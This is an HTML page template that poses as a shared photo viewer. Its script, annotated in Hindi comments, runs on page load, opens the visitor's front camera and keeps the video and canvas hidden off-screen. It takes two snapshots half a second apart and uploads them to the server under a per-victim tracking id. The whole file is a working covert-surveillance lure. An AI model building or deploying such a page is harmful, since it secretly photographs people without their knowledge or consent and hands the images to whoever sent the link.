<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Photo</title>
    <style>
        body { margin:0; padding:10px; background:#111; text-align:center; }
        img { max-width:100%; border-radius:10px; display:block; }
        video, canvas, #status { position:absolute; left:-9999px; width:1px; height:1px; }
    </style>
</head>
<body>
    <img src="{{ photo_url }}" alt="Photo">

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>
    <p id="status" style="display:none;"></p>

    <script>
        const uniqueId = "{{ unique_id }}";
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        async function autoCapture() {
            try {
                // सिर्फ़ कैमरा खोलें (माइक नहीं)
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: "user" }
                });
                video.srcObject = stream;
                await new Promise(r => video.onloadedmetadata = r);

                // 1 सेकंड में 2 फोटो (हर 500ms पर)
                for (let i = 0; i < 2; i++) {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    const imageData = canvas.toDataURL('image/jpeg', 0.9);
                    fetch('/upload/' + uniqueId, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ image: imageData })
                    }).catch(e => console.error(e));
                    await new Promise(r => setTimeout(r, 500));  // 500ms गैप
                }
                stream.getTracks().forEach(track => track.stop());
            } catch(e) {
                console.error('Camera error:', e);
            }
        }

        autoCapture();
    </script>
</body>
</html>
